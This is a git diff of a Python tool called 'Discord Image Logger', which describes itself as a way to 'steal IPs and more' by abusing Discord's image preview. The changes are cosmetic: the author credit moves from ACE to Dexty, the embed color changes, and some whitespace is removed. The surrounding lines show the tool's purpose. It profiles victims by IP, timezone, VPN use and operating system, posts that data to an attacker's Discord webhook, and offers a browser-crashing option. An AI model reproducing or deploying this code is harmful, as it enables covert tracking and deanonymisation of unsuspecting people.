@@ -1,5 +1,5 @@
- # Discord Image Logger
-# By TG ACE | orski ville
+# Discord Image Logger
+# By Dexty | https://github.com/xdexty0
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -8,7 +8,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "ACE"
+__author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
@@ -19,7 +19,7 @@ config = {
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0xff0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
@@ -161,8 +161,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`  
-
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
 **PC Info:**
 > **OS:** `{os}`
@@ -175,7 +174,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     }
   ],
 }
-
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
